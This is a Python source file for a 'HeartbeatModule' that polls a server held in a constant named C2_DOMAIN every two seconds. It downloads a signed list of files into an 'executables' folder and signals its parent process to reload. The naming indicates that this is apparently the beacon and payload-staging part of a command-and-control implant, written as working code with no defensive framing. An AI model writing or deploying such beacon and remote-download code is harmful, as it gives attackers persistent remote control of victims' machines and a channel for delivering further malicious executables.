import os
import json
import signal
import logging
from pathlib import Path
from typing import Optional
import requests

from .common import IntervalExecutable
from crypto import crypto_manager

logger = logging.getLogger(__name__)

# Test

class HeartbeatModule(IntervalExecutable):
    """Send a heartbeat and check for updates"""

    interval = 2
    C2_DOMAIN = "http://localhost:8000"
    VERSION_FILE = Path("version.txt")
    EXECUTABLES_DIR = Path("executables")
    REQUEST_TIMEOUT = 10  # seconds

    @staticmethod
    def execute() -> None:
        try:
            HeartbeatModule._check_and_update()
        except Exception as e:
            logger.error(f"Heartbeat execution failed: {e}", exc_info=True)

    @staticmethod
    def _check_and_update() -> None:
        latest_version = HeartbeatModule._fetch_latest_version()
        if latest_version is None:
            return

        local_version = HeartbeatModule._get_local_version()

        if local_version is None or latest_version > local_version:
            if HeartbeatModule._download_updates(local_version or -1):
                HeartbeatModule._save_version(latest_version)
                os.kill(os.getppid(), signal.SIGUSR1)

    @staticmethod
    def _fetch_latest_version() -> Optional[int]:
        try:
            response = requests.post(
                url=f"{HeartbeatModule.C2_DOMAIN}/heartbeat",
                timeout=HeartbeatModule.REQUEST_TIMEOUT,
            )
            response.raise_for_status()

            version = response.json().get("version")
            if not isinstance(version, int):
                logger.error(f"Invalid version type: {type(version)}")
                return None

            logger.info(f"Latest version: {version}")
            return version

        except requests.RequestException as e:
            logger.error(f"Failed to fetch latest version: {e}")
            return None
        except (ValueError, KeyError) as e:
            logger.error(f"Invalid response format: {e}")
            return None

    @staticmethod
    def _get_local_version() -> Optional[int]:
        try:
            if HeartbeatModule.VERSION_FILE.exists():
                return int(HeartbeatModule.VERSION_FILE.read_text().strip())
            return None
        except (ValueError, IOError) as e:
            logger.error(f"Failed to read local version: {e}")
            return None

    @staticmethod
    def _save_version(version: int) -> None:
        try:
            HeartbeatModule.VERSION_FILE.write_text(str(version))
        except IOError as e:
            logger.error(f"Failed to save version: {e}")

    @staticmethod
    def _download_updates(local_version: int) -> bool:
        logger.info(f"Downloading updates since v{local_version}...")

        try:
            # Fetch list of files to update
            updates_res = requests.get(
                url=f"{HeartbeatModule.C2_DOMAIN}/updates",
                params={"version": local_version},
                timeout=HeartbeatModule.REQUEST_TIMEOUT,
            )
            updates_res.raise_for_status()

            response_data = updates_res.json()
            manifest = response_data.get("manifest")
            signature = response_data.get("signature")

            crypto_manager.verify(
                json.dumps(manifest, sort_keys=True),
                signature=signature,
            )

            filenames = manifest.get("filenames", [])
            if not isinstance(filenames, list):
                logger.error("Invalid filenames format")
                return False

            # Ensure directory exists
            HeartbeatModule.EXECUTABLES_DIR.mkdir(parents=True, exist_ok=True)

            # Download each file
            for fn in filenames:
                if not HeartbeatModule._is_safe_filename(fn):
                    logger.error(f"Unsafe filename rejected: {fn}")
                    continue

                if not HeartbeatModule._download_file(fn):
                    return False

            return True

        except requests.RequestException as e:
            logger.error(f"Failed to fetch updates: {e}")
            return False
        except (ValueError, KeyError) as e:
            logger.error(f"Invalid updates response: {e}")
            return False

    @staticmethod
    def _is_safe_filename(filename: str) -> bool:
        """Validate filename to prevent path traversal attacks"""
        safe_path = (HeartbeatModule.EXECUTABLES_DIR / filename).resolve()
        return HeartbeatModule.EXECUTABLES_DIR.resolve() in safe_path.parents

    @staticmethod
    def _download_file(filename: str) -> bool:
        try:
            file_res = requests.get(
                url=f"{HeartbeatModule.C2_DOMAIN}/updates/{filename}",
                timeout=HeartbeatModule.REQUEST_TIMEOUT,
            )
            file_res.raise_for_status()

            target_path = HeartbeatModule.EXECUTABLES_DIR / filename
            target_path.write_bytes(file_res.content)
            logger.info(f"Downloaded: {filename}")
            return True

        except requests.RequestException as e:
            logger.error(f"Failed to download {filename}: {e}")
            return False
        except IOError as e:
            logger.error(f"Failed to write {filename}: {e}")
            return False
